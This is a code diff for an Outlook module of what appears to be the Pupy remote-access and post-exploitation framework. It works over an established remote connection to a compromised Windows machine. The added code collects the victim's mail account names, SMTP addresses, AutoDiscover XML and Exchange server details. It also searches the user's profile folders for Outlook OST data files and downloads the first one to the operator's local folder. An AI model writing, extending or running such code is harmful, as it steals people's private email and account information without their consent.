@@ -3,6 +3,7 @@
 import os, logging, sys, time
 from rpyc.utils.classic import download
 from pupylib.utils.term import colorize
+from collections import OrderedDict
 
 class outlook():
 	'''
@@ -10,8 +11,10 @@ class outlook():
 	
 	OL_SAVE_AS_TYPE={'olTXT': 0,'olRTF':1,'olTemplate': 2,'olMSG': 3,'olDoc':4,'olHTML':5,'olVCard': 6,'olVCal':7,'olICal': 8}
 	OL_DEFAULT_FOLDERS = {'olFolderDeletedItems':3,'olFolderDrafts':16,'olFolderInbox':6,'olFolderJunk':23,'olFolderSentMail':5}
+	OL_ACCOUNT_TYPES = {4:'olEas',0:'olExchange',3:'olHttp',1:'olImap',5:'olOtherAccount',2:'olPop3'}
+	OL_EXCHANGE_CONNECTION_MODE = {100:'olOffline',500:'olOnline',200:'olDisconnected',300:'olConnectedHeaders',400:'olConnected',0:'olNoExchange'}
 	
-	def __init__(self, module, rootPupyPath, localFolder="output/", folderIndex=None, folderId=None, sleepTime=3, msgSaveType='olMSG'):
+	def __init__(self, module, rootPupyPath, localFolder="output/", folderIndex=None, folderId=None, sleepTime=3, msgSaveType='olMSG', autoConnectToMAPI=True):
 		'''
 		'''
 		self.module = module
@@ -26,25 +29,52 @@ class outlook():
 		self.constants = None
 		self.sleepTime = sleepTime
 		self.remoteTempFolder = self.module.client.conn.modules['os.path'].expandvars("%TEMP%")
-		self.__connect__()
+		if autoConnectToMAPI == True : self.__connect__()
 		if not os.path.exists(self.localFolder):
 			logging.debug("Creating the {0} folder locally".format(self.localFolder))
 			os.makedirs(self.localFolder)
-	
+				
 	def __connect__(self):
 		'''
+		Returns True if no error
+		Otherise returns False
 		'''
+		
 		self.outlook = self.module.client.conn.modules['win32com.client'].Dispatch("Outlook.Application")
 		#self.outlook = self.module.client.conn.modules['win32com.client.gencache'].EnsureDispatch("Outlook.Application")
 		self.mapi = self.outlook.GetNamespace("MAPI")
 		if self.folderId == None : self.setDefaultFolder(folderIndex=self.folderIndex)
 		else : self.setFolderFromId(folderId=self.folderId)
+		return True
 	
 	def close(self):
 		'''
 		'''
 		logging.debug("Closing Outlook link...")
 		self.outlook.Quit()
+		
+	def getInformation(self):
+		'''
+		Returns Dictionnary
+		'''
+		info = OrderedDict()
+		info['CurrentProfileName']=self.mapi.CurrentProfileName
+		#info['CurrentUserAddress']=repr(self.mapi.CurrentUser) #Needs to be authenticiated to remote mail server. Otherwise, infinite timeout
+		info['SessionType']=self.outlook.Session.Type
+		for i, anAccount in enumerate(self.outlook.Session.Accounts):
+			info['Account{0}-DisplayName'.format(i)]=anAccount.DisplayName
+			info['Account{0}-SmtpAddress'.format(i)]=anAccount.SmtpAddress
+			info['Account{0}-AutoDiscoverXml'.format(i)]=anAccount.AutoDiscoverXml
+			info['Account{0}-AccountType'.format(i)]=self.OL_ACCOUNT_TYPES[anAccount.AccountType]
+			#info['Account{0}-UserName'.format(i)]=anAccount.UserName #Needs to be authenticiated to remote mail server. Otherwise, infinite timeout
+		info['ExchangeMailboxServerName']=self.mapi.ExchangeMailboxServerName #Returns a String value that represents the name of the Exchange server that hosts the primary Exchange account mailbox.
+		info['ExchangeMailboxServerVersion']=self.mapi.ExchangeMailboxServerVersion #Returns a String value that represents the full version number of the Exchange server that hosts the primary Exchange account mailbox.
+		info['Offline']=self.mapi.Offline #Returns a Boolean indicating True if Outlook is offline (not connected to an Exchange server), and False if online (connected to an Exchange server)
+		info['ExchangeConnectionMode']=self.OL_EXCHANGE_CONNECTION_MODE[self.mapi.ExchangeConnectionMode]
+		self.mapi.SendAndReceive(True)
+		print repr(self.mapi)
+		return info
+		
 		
 	def __getOlDefaultFoldersNameFromIndex__(self, folderIndex):
 		'''
@@ -192,6 +222,42 @@ class outlook():
 			print "{0}: {1}".format(i, folder.encode('utf-8'))
 			for j,subFolder in enumerate(foldersAndSubFolders[folder]):
 				print "  {0}.{1}: {2} (id: {3})".format(i, j, subFolder.encode('utf-8'), foldersAndSubFolders[folder][subFolder].encode('utf-8'))
+	
+	
+	def getPathToOSTFiles(self):
+		'''
+		According to https://support.office.com/en-us/article/Locating-the-Outlook-data-files-0996ece3-57c6-49bc-977b-0d1892e2aacc
+		'''
+		paths = []
+		DEFAULT_LOCATIONS_OST = ["<drive>:\Users\<username>\AppData\Local\Microsoft\Outlook",
+		"<drive>:\Documents and Settings\<username>\Local Settings\Application Data\Microsoft\Outlook"
+		]
+		systemDrive = self.module.client.conn.modules['os'].getenv("SystemDrive")
+		login = self.module.client.conn.modules['os'].getenv("username")
+		for aLocationOST in DEFAULT_LOCATIONS_OST :
+			completeLocationOST = aLocationOST.replace("<drive>",systemDrive[:-1]).replace("<username>",login)
+			regex = self.module.client.conn.modules['os.path'].join(completeLocationOST,"*.ost")
+			logging.debug('Searching OST file in {0}'.format(regex))
+			files = self.module.client.conn.modules['glob'].glob(regex)
+			for aFile in files:
+				ostFileFound = self.module.client.conn.modules['os.path'].join(completeLocationOST,aFile)
+				logging.info('OST file found in {0}'.format(ostFileFound))
+				paths.append(ostFileFound)
+		return paths
+		
+	def downloadOSTFile(self):
+		'''
+		Return file downloaded or None
+		'''
+		paths = self.getPathToOSTFiles()
+		if len(paths)>0:
+			filename = self.module.client.conn.modules['os.path'].basename(paths[0])
+			logging.debug("Downloading the file {0} to {1}".format(paths[0], self.localFolder))
+			download(self.module.client.conn, paths[0], os.path.join(self.localFolder, filename))
+			return paths[0]
+		else:
+			return None
+		
 	
 	"""
 	def __getRecipientsAddresses__(self, RecipientsObject):
